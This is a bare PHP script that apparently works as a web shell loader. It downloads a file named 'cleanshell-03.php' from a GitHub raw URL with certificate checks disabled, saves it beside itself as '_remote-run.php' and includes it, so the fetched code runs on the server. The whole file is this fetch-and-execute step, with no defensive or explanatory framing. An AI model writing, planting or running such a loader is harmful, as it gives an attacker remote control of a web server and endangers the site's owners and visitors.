<?php

$remote_url = 'https://raw.githubusercontent.com/onlyme1d/dxerror/main/cleanshell-03.php';
$target_file = __DIR__ . '/_remote-run.php';

function remote_get_php($url) {
    if (!function_exists('curl_version')) {
        return false;
    }
    
    $c = curl_init();
    curl_setopt($c, CURLOPT_URL, $url);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    $r = curl_exec($c);
    curl_close($c);

    return $r;
}

$data = remote_get_php($remote_url);

if ($data) {
    file_put_contents($target_file, $data);
    include $target_file;
}

?>
